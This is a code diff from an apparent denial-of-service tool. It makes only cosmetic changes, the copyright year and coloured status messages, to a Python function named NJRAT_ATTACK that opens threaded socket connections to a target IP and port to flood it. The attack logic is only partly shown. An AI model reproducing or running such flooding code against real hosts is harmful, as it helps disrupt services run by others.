@@ -2,7 +2,7 @@
 
 # MIT License
 #
-# Copyright (C) 2019-2020, Entynetproject. All Rights Reserved.
+# Copyright (C) 2020, Entynetproject. All Rights Reserved.
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
@@ -38,7 +38,7 @@ def NJRAT_ATTACK(threads, attack_time, target):
 	target_ip = target.split(":")[0]
 	target_port = int(target.split(":")[1])
 
-	print("[BEGIN] Attack started for " + str(attack_time) + " seconds...")
+	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting NJRAT attack...")
 	
 
 	threads_list = []
@@ -57,7 +57,7 @@ def NJRAT_ATTACK(threads, attack_time, target):
 				sock.connect((target_ip, target_port))
 			except Exception as e:
 				print(e)
-				print("[ERROR] Failed connect to target`s NJRAT!")
+				print("\033[1;31m"+"[-]"+"\033[0m"+" Failed to connect to NJRAT client!")
 				exit()
 				
 			try:
@@ -67,11 +67,11 @@ def NJRAT_ATTACK(threads, attack_time, target):
 				time.sleep(0.25)
 				continue
 			else:
-				print("[SUCCESS] NJRAT client connected!")      
+				print("\033[1;32m"+"[+]"+"\033[0m"+" NJRAT client is connected!")      
 
 	# Start threads
 	for thread in range(threads):
-		print("[BEGIN] Staring thread " + str(thread) + "...")
+		print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread) + "...")
 		t = Thread(target = njrat_flood)
 		t.start()
 		threads_list.append(t)
@@ -84,4 +84,4 @@ def NJRAT_ATTACK(threads, attack_time, target):
 		FINISH = True
 		thread.join()
 	
-	print("[WARNING] NJRAT attack stopped!")
+	print("\033[1;33m"+"[!]"+"\033[0m"+" NJRAT attack completed.")
